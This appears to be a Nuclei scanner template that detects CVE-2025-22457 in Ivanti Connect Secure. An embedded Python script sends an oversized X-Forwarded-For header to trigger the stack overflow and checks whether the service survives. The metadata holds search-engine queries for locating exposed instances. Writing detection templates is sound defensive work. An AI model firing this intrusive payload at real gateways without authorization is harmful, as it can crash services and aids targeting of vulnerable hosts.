code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - 'VULNERABLE:'
  source: "import os\nimport time\nimport requests\n\nTARGET_PATH = \"/dana-na/auth/url_default/welcome.cgi\"\
    \nTIMEOUT = 10\n\nclass IvantiExploit:\n    def __init__(self, host, port):\n\
    \        self.host = host.rstrip(\"/\")\n        self.port = port\n\n    def check_vuln(self):\n\
    \        host = self.host\n        if not host.startswith(\"http://\") and not\
    \ host.startswith(\"https://\"):\n            host = f\"https://{host}\"\n\n \
    \       url = f\"{host}:{self.port}{TARGET_PATH}\"\n\n        print(f\"Testing\
    \ {url}\")\n\n        #1  Pre-check: Check if target is reachable and status is\
    \ 200.\n        try:\n            r1 = requests.get(url, timeout=TIMEOUT, verify=False)\n\
    \        except requests.RequestException:\n            r1 = None\n        if\
    \ not r1 or r1.status_code != 200:\n            print(\"Pre-check failed because\
    \ target is not reachable or status is not 200.\")\n            return False\n\
    \n        print(\"Pre-check successful.\")\n\n        #2 Payload: Send POST request\
    \ with X-Forwarded-For header to test the vulnerability.\n\n        payload_header\
    \ = {\"X-Forwarded-For\": \"1\"*2048}\n        try:\n            r2 = requests.post(url,\
    \ headers=payload_header, timeout=TIMEOUT, verify=False)\n        except requests.RequestException:\n\
    \            r2 = None\n        if r2:\n            print(\"Payload is not working.\"\
    )\n            return False\n        else:\n            print(\"Payload is working.\"\
    )\n        time.sleep(1)\n\n        #3 Follow-up: Check if target is still reachable\
    \ after payload.\n\n        try:\n            r3 = requests.get(url, timeout=TIMEOUT,\
    \ verify=False)\n        except requests.RequestException:\n            r3 = None\n\
    \        if r3.status_code == 200:\n            print(f\"VULNERABLE: {self.host}:{self.port}\"\
    )\n            return True\n\n        print(\"Target seems safe\")\n        return\
    \ False\n\nif __name__ == \"__main__\":\n    host = os.getenv(\"Host\")\n    port\
    \ = os.getenv(\"Port\")\n    IvantiExploit(host, port).check_vuln()\n"
flow: http () && code()
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "Ivanti Connect Secure")
    - status_code == 200
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/dana-na/auth/url_default/welcome.cgi'
  stop-at-first-match: true
id: CVE-2025-22457
info:
  author: s4e-io,pussycat0x
  classification:
    cpe: cpe:2.3:a:ivanti:connect_secure:*:-:*:*:*:*:*:*
    cve-id: CVE-2025-22457
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.0
    cwe-id: CWE-121,CWE-787
    epss-percentile: 0.97659
    epss-score: 0.49132
  description: 'Ivanti Connect Secure before version 22.7R2.6, Ivanti Policy Secure
    before version 22.7R1.4,

    and Ivanti ZTA Gateways before version 22.8R2.2 contain a stack-based buffer overflow
    caused by

    improper input handling, allowing remote attackers to execute arbitrary code without
    authentication.

    '
  impact: 'Remote attackers can execute arbitrary code on the affected systems, potentially
    leading to full system compromise.

    '
  metadata:
    fofa-query: title="ivanti connect secure"
    google-query: intitle:"ivanti connect secure"
    product: connect_secure
    shodan-query: http.title:"ivanti connect secure"
    vendor: ivanti
    zoomeye-query: title:"ivanti connect secure"
  name: Ivanti Connect Secure - Stack-based Buffer Overflow
  reference:
  - https://labs.watchtowr.com/is-the-sofistication-in-the-room-with-us-x-forwarded-for-and-ivanti-connect-secure-cve-2025-22457
  - https://www.cvedetails.com/cve/CVE-2025-22457
  - https://github.com/securekomodo/CVE-2025-22457
  remediation: 'Update to the latest versions: Ivanti Connect Secure 22.7R2.6 or later,
    Ivanti Policy Secure 22.7R1.4 or later, Ivanti ZTA Gateways 22.8R2.2 or later.

    '
  severity: critical
  tags: cve,cve2025,ivanti,intrusive,kev,vkev,vuln
variables:
  HOST: '{{Host}}'
  PORT: '{{Port}}'
